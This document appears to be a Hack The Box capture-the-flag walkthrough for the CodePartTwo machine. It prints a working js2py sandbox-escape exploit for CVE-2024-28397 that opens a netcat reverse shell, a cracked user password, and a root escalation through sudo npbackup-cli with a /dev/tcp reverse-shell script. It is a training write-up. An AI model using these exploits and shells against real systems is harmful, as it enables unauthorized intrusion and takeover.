---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# CodePartTwo Machine Walk-through

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the_ CodePartTwo _machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### Machine Info

* **Machine Name:** CodePartTwo
* **Machine Type:** Linux
* **Difficulty:** Easy
* **Link:** \[[https://app.hackthebox.com/machines/CodePartTwo](https://app.hackthebox.com/machines/CodePartTwo)]

***

Nmap Scan

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.82 -oN scan.txt

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Welcome to CodeTwo
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/17%OT=22%CT=3%CU=43123%PV=Y%DS=2%DC=T%G=Y%TM=68A1E82
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 37.938 days (since Thu Jul 10 21:32:08 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   67.62 ms 10.10.14.1
2   67.63 ms 10.10.11.82

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:03
Completed NSE at 20:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:03
Completed NSE at 20:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:03
Completed NSE at 20:03, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.47 seconds
           Raw packets sent: 378627 (16.660MB) | Rcvd: 55517 (2.221MB)
```

Here we can see two port are open 22 and 8000.

We Browse that the port 8000 and Register and Login the website we can see that the website give ous a compiler to execute script.

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Now we try to direcotry listing for any interesting information or entry points.

```bash
feroxbuster -u http://10.10.11.82:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o feroxbuster_result.txt -C 403,404,500
```

<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

Here we can see a interesting directory which is /download. let's browse it.

After browse the directory a zip file will be downloaded called **app.zip**. Now we can try to extract the zip file and we can see that the the website's source code and other document is store here.

Now lets analysis the source code and other direcotyr for any vulnerability or confidential information. And we can found a password called `S3cr3tK3yC0d3Tw0` from app.py. But we don't know the username, so we want to enumerate the system for more information.

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

We can check the requirements.txt file and we can see a vulnerable python library and [CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397) which has RCE vulnerability.

<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

We can see the CVE that:

"**CVE-2024-28397 (CVSS 8.8): An attacker can take advantage of the vulnerability by tricking a target into processing a malicious JavaScript file, either through a compromised website or a misleading API call. Once the malicious script is executed, the attacker gets access to the system and allows him to run any commands he wants.**"

That's mean we want to a reverse shell JavaScript payload and run the script or payload inside the given compiler to get payload.

So our JavaScript reverse shell payload is:

```bash
let cmd = "busybox nc 10.10.14.95 4848 -e /bin/bash; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

And we get Reverse shell.

<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

Now we have access the app user shell but here has another user called marco, we want to get marco user shell to get user flag.\
After many research and enumerate the system we found a marco user password hash from `/home/app/app/instance/user.db` file and creack the password using CrackStation and get password `sweetangelbabylove`.

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

Now we successfully login marco user using ssh and get user flag 🎉.

<figure><img src="../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

After enumerate the machine for PrivEsc we find a interesting Dierctory called "npbackup-cli" inside /opt direcoty. which has permission this:

```bash
drwxr-x---  2 root backups 4096 Apr  6 00:07 npbackup-cli
```

And we see that our marco user is a member of backups group. but it is not enough we need to more information.

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

We can also check the sudo permission by using `sudo -l` and see this:

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

That means we can execute **/usr/local/bin/npbackup-cli** using **sudo**.

When we run **/usr/local/bin/npbackup-cli** without **sudo** it is generate this error:

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Now we can try to exploit this.

1. We create a reverse shell file called **revsh** in side **/tmp** directory with the script:

```bash
#!/bin/bash
exec /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.95/9292 0>&1'
SH
```

2. Then run the Netcat Listener in another terminal to get reverse shell cunnection:

```bash
 rlwrap nc -lnvp 9292
```

3. Now run the following command to execute our script with sudo privilege.

```bash
sudo  /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --external-backend-binary=/tmp/revsh -b --repo-name default
```

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

And BOOM we succsessfully get root shell and also get root flag 💥.

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

#### Follow me on below Social Media:

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
